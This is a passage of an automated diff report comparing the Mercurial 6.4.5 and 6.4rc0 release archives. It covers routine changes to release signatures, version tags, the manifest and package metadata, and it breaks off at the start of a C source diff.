+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2716 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/ext-sidedata-3.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      529 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/ext-sidedata-4.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2438 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/ext-sidedata-5.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3558 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/ext-sidedata.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      667 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/ext-stream-clone-steps.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2433 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/merge-combination-util.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      244 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/obsmarker-common.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10380 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/persistent-nodemap-race-ext.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      998 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/push-checkheads-util.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3790 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/sigpipe-remote.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      395 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/sigpipe-worker.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2226 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/stream_clone_setup.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      948 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/wait-on-file
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     6664 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/tinyproxy.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      146 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/unwrap-message-id.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      795 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/wireprotohelpers.sh
```

### Comparing `mercurial-6.4.5/.gitlab/merge_request_templates/Default.md` & `mercurial-6.4rc0/.gitlab/merge_request_templates/Default.md`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/.hgignore` & `mercurial-6.4rc0/.hgignore`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/.hgsigs` & `mercurial-6.4rc0/.hgsigs`

 * *Files 3% similar despite different names*

```diff
@@ -235,13 +235,7 @@
 b5c8524827d20fe2e0ca8fb1234a0fe35a1a36c7 0 iQHNBAABCgA3FiEEH2b4zfZU6QXBHaBhoR4BzQ4F2VYFAmMQxRoZHGFscGhhcmVAcmFwaGFlbGdvbWVzLmRldgAKCRChHgHNDgXZVm2gC/9HikIaOE49euIoLj6ctYsJY9PSQK4Acw7BXvdsTVMmW27o87NxH75bGBbmPQ57X1iuKLCQ1RoU3p2Eh1gPbkIsouWO3enBIfsFmkPtWQz28zpCrI9CUXg2ug4PGFPN9XyxNmhJ7vJ4Cst2tRxz9PBKUBO2EXJN1UKIdMvurIeT2sQrDQf1ePc85QkXx79231wZyF98smnV7UYU9ZPFnAzfcuRzdFn7UmH3KKxHTZQ6wAevj/fJXf5NdTlqbeNmq/t75/nGKXSFPWtRGfFs8JHGkkLgBiTJVsHYSqcnKNdVldIFUoJP4c2/SPyoBkqNvoIrr73XRo8tdDF1iY4ddmhHMSmKgSRqLnIEgew3Apa/IwPdolg+lMsOtcjgz4CB9agJ+O0+rdZd2ZUBNMN0nBSUh+lrkMjat8TJAlvut9h/6HAe4Dz8WheoWol8f8t1jLOJvbdvsMYi+Hf9CZjp7PlHT9y/TnDarcw2YIrf6Bv+Fm14ZDelu9VlF2zR1X8cofY=
 dbdee8ac3e3fcdda1fa55b90c0a235125b7f8e6f 0 iQHNBAABCgA3FiEEH2b4zfZU6QXBHaBhoR4BzQ4F2VYFAmM77dQZHGFscGhhcmVAcmFwaGFlbGdvbWVzLmRldgAKCRChHgHNDgXZViOTC/sEPicecV3h3v47VAIUigyKNWpcJ+epbRRaH6gqHTkexvULOPL6nJrdfBHkNry1KRtOcjaxQvtWZM+TRCfqsE++Q3ZYakRpWKontb/8xQSbmENvbnElLh6k0STxN/JVc480us7viDG5pHS9DLsgbkHmdCv5KdmSE0hphRrWX+5X7RTqpAfCgdwTkacB5Geu9QfRnuYjz6lvqbs5ITKtBGUYbg3hKzw2894FHtMqV6qa5rk1ZMmVDbQfKQaMVG41UWNoN7bLESi69EmF4q5jsXdIbuBy0KtNXmB+gdAaHN03B5xtc+IsQZOTHEUNlMgov3yEVTcA6fSG9/Z+CMsdCbyQxqkwakbwWS1L2WcAsrkHyafvbNdR2FU34iYRWOck8IUg2Ffv7UFrHabJDy+nY7vcTLb0f7lV4jLXMWEt1hvXWMYek6Y4jtWahg6fjmAdD3Uf4BMfsTdnQKPvJpWXx303jnST3xvFvuqbbbDlhLfAB9M6kxVntvCVkMlMpe39+gM=
 a3356ab610fc50000cf0ba55c424a4d96da11db7 0 iQHNBAABCgA3FiEEH2b4zfZU6QXBHaBhoR4BzQ4F2VYFAmNWr44ZHGFscGhhcmVAcmFwaGFlbGdvbWVzLmRldgAKCRChHgHNDgXZVjalC/9ddIeZ1qc3ykUZb+vKw+rZ6WS0rnDgrfFYBQFooK106lB+IC2PlghXSrY2hXn/7Dk95bK90S9AO4TFidDPiRYuBYdXR+G+CzmYFtCQzGBgGyrWgpUYsZUeA3VNqZ+Zbwn/vRNiFVNDsrFudjE6xEwaYdepmoXJsv3NdgZME7T0ZcDIujIa7ihiXvGFPVzMyF/VZg4QvdmerC4pvkeKC3KRNjhBkMQbf0GtQ4kpgMFBj5bmgXbq9rftL5yYy+rDiRQ0qzpOMHbdxvSZjPhK/do5M3rt2cjPxtF+7R3AHxQ6plOf0G89BONYebopY92OIyA3Qg9d/zIKDmibhgyxj4G9YU3+38gPEpsNeEw0fkyxhQbCY3QpNX4JGFaxq5GVCUywvVIuqoiOcQeXlTDN70zhAQHUx0rcGe1Lc6I+rT6Y2lNjJIdiCiMAWIl0D+4SVrLqdMYdSMXcBajTxOudb9KZnu03zNMXuLb8FFk1lFzkY7AcWA++d02f15P3sVZsDXE=
 04f1dba53c961dfdb875c8469adc96fa999cfbed 0 iQHNBAABCgA3FiEEH2b4zfZU6QXBHaBhoR4BzQ4F2VYFAmNyC5sZHGFscGhhcmVAcmFwaGFlbGdvbWVzLmRldgAKCRChHgHNDgXZVqF+C/4uLaV/4nizZkWD3PjU1WyFYDg4bWDFOHb+PWuQ/3uoHXu1/EaYRnqmcDyOSJ99aXZBQ78rm9xhjxdmbklZ4ll1EGkqfTiYH+ld+rqE8iaqlc/DVy7pFXaenYwxletzO1OezzwF4XDLi6hcqzY9CXA3NM40vf6W4Rs5bEIi4eSbgJSNB1ll6ZzjvkU5bWTUoxSH+fxIJUuo27El2etdlKFQkS3/oTzWHejpVn6SQ1KyojTHMQBDRK4rqJBISp3gTf4TEezb0q0HTutJYDFdQNIRqx7V1Ao4Ei+YNbenJzcWJOA/2uk4V0AvZ4tnjgAzBYKwvIL1HfoQ0OmILeXjlVzV7Xu0G57lavum0sKkz/KZLKyYhKQHjYQLE7YMSM2y6/UEoFNN577vB47CHUq446PSMb8dGs2rmj66rj4iz5ml0yX+V9O2PpmIKoPAu1Y5/6zB9rCL76MRx182IW2m3rm4lsTfXPBPtea/OFt6ylxqCJRxaA0pht4FiAOvicPKXh4=
 c890d8b8bc59b18e5febf60caada629df5356ee2 0 iQHNBAABCgA3FiEEH2b4zfZU6QXBHaBhoR4BzQ4F2VYFAmN48sEZHGFscGhhcmVAcmFwaGFlbGdvbWVzLmRldgAKCRChHgHNDgXZVqwwC/9GkaE5adkLaJBZeRqfLL710ZPMAttiPhLAYl9YcUeUjw2rTU1bxxUks0oSfW4J0AaJLscl+pG4zZW8FN2MXY3njdcpAA/bv4nb+rq50Mdm0mD3iLOyKbIDQbUoYe7YpIPbpyuf8G/y4R1IXiLJjK329vzIsHkqyKPwUzxvyfZkjg6Lx00RRcfWrosb2Jb0+EhP9Yi7tjJmNWjsaTb8Ufp+ImYAL3qcDErkqb6wJCGAM0AwVfAJ7MZz3v3E56n1HTPhNqf8UvfR4URsuDlk56mP4do/QThC7dANiKeWrFJSBPu8uSpaHzUk1XCat0RHK03DMr15Ln1YCEhTmaedHr2rtp0fgGqaMH1jLZt0+9fiPaaYjck7Y+aagdc3bt1VhqtClbCJz5KWynpCLrn8MX40QmXuwly+KHzMuPQ6i0ui95ifgtrW7/Zd7uI7mYZ2zUeFUZPnL9XmGpFI595N8TjoPuFeO/ea4OQbLUY+lmmgZQrWoTpc5LDUyFXSFzJS2bU=
 59466b13a3ae0e29a5d4f485393e516cfbb057d0 0 iQHNBAABCgA3FiEEH2b4zfZU6QXBHaBhoR4BzQ4F2VYFAmO1XgoZHGFscGhhcmVAcmFwaGFlbGdvbWVzLmRldgAKCRChHgHNDgXZVn8nDACU04KbPloLl+if6DQYreESnF9LU8C+qnLC/j5RRuaFNh/ec6C3DzLWqWdmnWA/siV3nUR1bXHfTui95azxJfYvWoXH2R2yam+YhE256B4rDDYWS1LI9kNNM+A33xcPS2HxVowkByhjB5FPKR6I90dX42BYJpTS5s/VPx63wXLznjFWuD7XJ3P0VI7D72j/+6EQCmHaAUEE5bO00Ob2JxmzJlaP+02fYc814PAONE2/ocfR0aExAVS3VA+SJGXnXTVpoaHr7NJKC2sBLFsdnhIRwtCf3rtGEvIJ5v2U2xx0ZEz/mimtGzW5ovkthobV4mojk0DRz7xBtA96pOGSRTD8QndIsdMCUipo8zZ/AGAMByCtsQOX7OYhR6gp+I6+iPh8fTR5oCbkO7cizDDQtXcrR5OT/BDH9xkAF1ghNL8o23a09/wfZ9NPg5zrh/4T/dFfoe2COlkAJJ1ttDPYyQkCfMsoWm3OXk6xJ3ExVbwkZzUDQSzsxGS+oxbFDWJZ64Q=
 8830004967ad865ead89c28a410405a6e71e0796 0 iQHNBAABCgA3FiEEH2b4zfZU6QXBHaBhoR4BzQ4F2VYFAmQAsOQZHGFscGhhcmVAcmFwaGFlbGdvbWVzLmRldgAKCRChHgHNDgXZVl7XC/0W+Wd4gzMUbaot+NVIZTpubNw3KHBDXrlMgwQgCDg7qcqJnVuT1NNEy5sRELjZOO0867k+pBchZaxdmAiFwY1W76+7nwiLBqfCkYgYY0iQe48JHTq9kCgohvx9PSEVbUsScmqAQImd5KzErjhsLj8D2FiFIrcMyqsCBq4ZPs0Ey7lVKu6q3z5eDjlrxUIr0up6yKvgBxhY0GxyTp6DGoinzlFMEadiJlsvlwO4C6UpzKiCGMeKNT5xHK/Hx3ChrOH2Yuu1fHaPLJ+ZpXjR33ileVYlkQrh1D6fWHXcP7ZuwsEKREtgsw1YjYczGFwmhBO362bNi5wy33mBtCvcIAqpsI0rMrExs66qqbfyG+Yp1dvkgzUfdhbYFHA+mvg3/YTSD9dLKzzsb69LM87+dvcLqhBJ0nEAuBmAzU5ECkoArbiwMT96NhhjLPRmJJdHNo0IDos/LBGTgkOZ6iqIx8Xm/tgjBjFJG8B+IVy3laNgun4AZ9Ejc3ahIfhJUIo2j8o=
-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
```

### Comparing `mercurial-6.4.5/.hgtags` & `mercurial-6.4rc0/.hgtags`

 * *Files 6% similar despite different names*

```diff
@@ -251,13 +251,7 @@
 04f1dba53c961dfdb875c8469adc96fa999cfbed 6.3.0
 04f1dba53c961dfdb875c8469adc96fa999cfbed 6.3
 04f1dba53c961dfdb875c8469adc96fa999cfbed 6.3.0
 0000000000000000000000000000000000000000 6.3.0
 c890d8b8bc59b18e5febf60caada629df5356ee2 6.3.1
 59466b13a3ae0e29a5d4f485393e516cfbb057d0 6.3.2
 8830004967ad865ead89c28a410405a6e71e0796 6.3.3
-05de4896508e8ec387b33eb30d8aab78d1c8e9e4 6.4rc0
-f14864fffdcab725d9eac6d4f4c07be05a35f59a 6.4
-83ea6ce48b4fd09fb79c4e34cc5750c805699a53 6.4.1
-f952be90b0514a576dcc8bbe758ce3847faba9bb 6.4.2
-fc445f8abcf90b33db7c463816a1b3560681767f 6.4.3
-da372c745e0f053bb7a64e74cccd15810d96341d 6.4.4
```

### Comparing `mercurial-6.4.5/.jshintrc` & `mercurial-6.4rc0/.jshintrc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/CONTRIBUTING` & `mercurial-6.4rc0/CONTRIBUTING`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/CONTRIBUTORS` & `mercurial-6.4rc0/CONTRIBUTORS`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/COPYING` & `mercurial-6.4rc0/COPYING`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/MANIFEST.in` & `mercurial-6.4rc0/MANIFEST.in`

 * *Files 0% similar despite different names*

```diff
@@ -1044,15 +1044,14 @@
 include relnotes/5.7
 include relnotes/5.8
 include relnotes/5.9
 include relnotes/6.0
 include relnotes/6.1
 include relnotes/6.2
 include relnotes/6.3
-include relnotes/6.4
 include relnotes/next
 include rust/.cargo/config
 include rust/Cargo.lock
 include rust/Cargo.toml
 include rust/README.rst
 include rust/chg/Cargo.lock
 include rust/chg/Cargo.toml
@@ -1231,14 +1230,15 @@
 include tests/flagprocessorext.py
 include tests/fsmonitor-run-tests.py
 include tests/generate-working-copy-states.py
 include tests/get-with-headers.py
 include tests/gpg/pubring.gpg
 include tests/gpg/secring.gpg
 include tests/gpg/trustdb.gpg
+include tests/helper-killhook.py
 include tests/helper-runtests.sh
 include tests/helpers-testrepo.sh
 include tests/heredoctest.py
 include tests/hghave
 include tests/hghave.py
 include tests/hgterm.ti
 include tests/hgweberror.py
@@ -1538,15 +1538,14 @@
 include tests/test-directaccess.t
 include tests/test-dirs.py
 include tests/test-dirstate-backup.t
 include tests/test-dirstate-race.t
 include tests/test-dirstate-race2.t
 include tests/test-dirstate-read-race.t
 include tests/test-dirstate-status-write-race.t
-include tests/test-dirstate-version-fallback.t
 include tests/test-dirstate.t
 include tests/test-dispatch.py
 include tests/test-dispatch.py.out
 include tests/test-dispatch.t
 include tests/test-docker-packaging.t
 include tests/test-doctest.py
 include tests/test-double-merge.t
@@ -1953,15 +1952,14 @@
 include tests/test-pull-bundle.t
 include tests/test-pull-http.t
 include tests/test-pull-network.t
 include tests/test-pull-permission.t
 include tests/test-pull-pull-corruption.t
 include tests/test-pull-r.t
 include tests/test-pull-update.t
-include tests/test-pullling-to-general-delta.t
 include tests/test-purge-ignored-directory.t
 include tests/test-purge.t
 include tests/test-push-cgi.t
 include tests/test-push-checkheads-multibranches-E1.t
 include tests/test-push-checkheads-multibranches-E2.t
 include tests/test-push-checkheads-multibranches-E3.t
 include tests/test-push-checkheads-partial-C1.t
@@ -2006,15 +2004,14 @@
 include tests/test-rebase-brute-force.t
 include tests/test-rebase-cache.t
 include tests/test-rebase-check-restore.t
 include tests/test-rebase-collapse.t
 include tests/test-rebase-conflicts.t
 include tests/test-rebase-dest.t
 include tests/test-rebase-detach.t
-include tests/test-rebase-dry-run.t
 include tests/test-rebase-empty-successor.t
 include tests/test-rebase-emptycommit.t
 include tests/test-rebase-inmemory.t
 include tests/test-rebase-interruptions.t
 include tests/test-rebase-issue-noparam-single-rev.t
 include tests/test-rebase-legacy.t
 include tests/test-rebase-mq-skip.t
@@ -2158,16 +2155,14 @@
 include tests/test-ssh-repoerror.t
 include tests/test-ssh.t
 include tests/test-sshserver.py
 include tests/test-stack.t
 include tests/test-state-extension.t
 include tests/test-static-http.t
 include tests/test-status-color.t
-include tests/test-status-committed-and-ignored.t
-include tests/test-status-eacces.t
 include tests/test-status-inprocess.py
 include tests/test-status-inprocess.py.out
 include tests/test-status-rev.t
 include tests/test-status-terse.t
 include tests/test-status-tracked-key.t
 include tests/test-status.t
 include tests/test-stdio.py
```

### Comparing `mercurial-6.4.5/Makefile` & `mercurial-6.4rc0/Makefile`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/PKG-INFO` & `mercurial-6.4rc0/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: mercurial
-Version: 6.4.5
+Version: 6.4rc0
 Summary: Fast scalable distributed SCM (revision control, version control) system
 Home-page: https://mercurial-scm.org/
 Download-URL: https://mercurial-scm.org/release/
 Author: Olivia Mackall and many others
 Author-email: mercurial@mercurial-scm.org
 License: GNU GPLv2 or any later version
 Classifier: Development Status :: 6 - Mature
```

### Comparing `mercurial-6.4.5/README.rst` & `mercurial-6.4rc0/README.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/Makefile.python` & `mercurial-6.4rc0/contrib/Makefile.python`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/all-revsets.txt` & `mercurial-6.4rc0/contrib/all-revsets.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/README.rst` & `mercurial-6.4rc0/contrib/automation/README.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/automation.py` & `mercurial-6.4rc0/contrib/automation/automation.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/__init__.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/aws.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/aws.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/cli.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/cli.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/linux.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/linux.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/pypi.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/pypi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/ssh.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/ssh.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/try_server.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/try_server.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/windows.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/windows.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/hgautomation/winrm.py` & `mercurial-6.4rc0/contrib/automation/hgautomation/winrm.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/linux-requirements-py3.5.txt` & `mercurial-6.4rc0/contrib/automation/linux-requirements-py3.5.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/linux-requirements-py3.txt` & `mercurial-6.4rc0/contrib/automation/linux-requirements-py3.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/linux-requirements.txt.in` & `mercurial-6.4rc0/contrib/automation/linux-requirements.txt.in`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/automation/requirements.txt` & `mercurial-6.4rc0/contrib/automation/requirements.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/base-revsets.txt` & `mercurial-6.4rc0/contrib/base-revsets.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/bash_completion` & `mercurial-6.4rc0/contrib/bash_completion`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/bdiff-torture.py` & `mercurial-6.4rc0/contrib/bdiff-torture.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/benchmarks/__init__.py` & `mercurial-6.4rc0/contrib/benchmarks/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/benchmarks/perf.py` & `mercurial-6.4rc0/contrib/benchmarks/perf.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/benchmarks/revset.py` & `mercurial-6.4rc0/contrib/benchmarks/revset.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/byteify-strings.py` & `mercurial-6.4rc0/contrib/byteify-strings.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/casesmash.py` & `mercurial-6.4rc0/contrib/casesmash.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/catapipe.py` & `mercurial-6.4rc0/contrib/catapipe.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/check-code.py` & `mercurial-6.4rc0/contrib/check-code.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/check-commit` & `mercurial-6.4rc0/contrib/check-commit`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/check-config.py` & `mercurial-6.4rc0/contrib/check-config.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/check-py3-compat.py` & `mercurial-6.4rc0/contrib/check-py3-compat.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/check-pytype.sh` & `mercurial-6.4rc0/contrib/check-pytype.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/Makefile` & `mercurial-6.4rc0/contrib/chg/Makefile`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/README` & `mercurial-6.4rc0/contrib/chg/README`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/chg.1` & `mercurial-6.4rc0/contrib/chg/chg.1`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/chg.c` & `mercurial-6.4rc0/contrib/chg/chg.c`

 * *Files 8% similar despite different names*

```diff
@@ -27,16 +27,14 @@
 #include "procutil.h"
 #include "util.h"
 
 #ifndef PATH_MAX
